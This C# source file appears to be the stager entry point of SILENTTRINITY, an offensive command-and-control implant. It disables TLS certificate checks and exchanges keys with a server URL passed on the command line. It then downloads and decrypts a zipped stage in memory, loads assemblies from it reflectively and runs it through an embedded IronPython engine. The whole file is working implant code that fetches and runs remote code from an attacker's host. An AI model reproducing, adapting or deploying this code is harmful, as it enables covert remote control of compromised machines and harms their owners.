using System;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Net;
using SILENTTRINITY.Utilities;
using System.Threading.Tasks;

namespace SILENTTRINITY
{
    public class ST
    {
        static ZipStorer Stage;

        static ST()
        {
            ServicePointManager.ServerCertificateValidationCallback += (sender, cert, chain, sslPolicyErrors) => true;
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;

            AppDomain.CurrentDomain.AssemblyResolve += STResolveEventHandler;
        }

        public static async Task Main(string[] args)
        {
            if (args.Length != 1)
            {
                Console.WriteLine("Usage: SILENTTRINITY.exe <URL> [<STAGE_URL>]");
                Environment.Exit(1);
            }

            Guid GUID = Guid.NewGuid();
            Uri URL = new Uri(new Uri(args[0]), GUID.ToString());

#if DEBUG
            Console.WriteLine("URL: {0}", URL);
            Console.WriteLine();
#endif

            Stage = ZipStorer.Open(new MemoryStream(Crypto.Decrypt(await Crypto.KeyExchangeAsync(URL), 
                                                                    await Http.GetAsync(URL))),
                                   FileAccess.ReadWrite, true);

            Engines.IronPython.Run(URL, GUID, ref Stage);
        }

        static Assembly STResolveEventHandler(object sender, ResolveEventArgs args)
        {
            byte[] bytes = null;

            string DllName = Internals.GetDLLName(args.Name);

            bytes = Internals.GetResourceInZip(Stage, DllName);

            if (bytes == null)
            { 
                bytes = File.ReadAllBytes(System.Runtime.InteropServices.RuntimeEnvironment.GetRuntimeDirectory() + DllName);
            }

            Assembly asm = Assembly.Load(bytes);
#if DEBUG
        Console.WriteLine("'{0}' loaded", asm.FullName);
#endif
            return asm;
        }
    }
}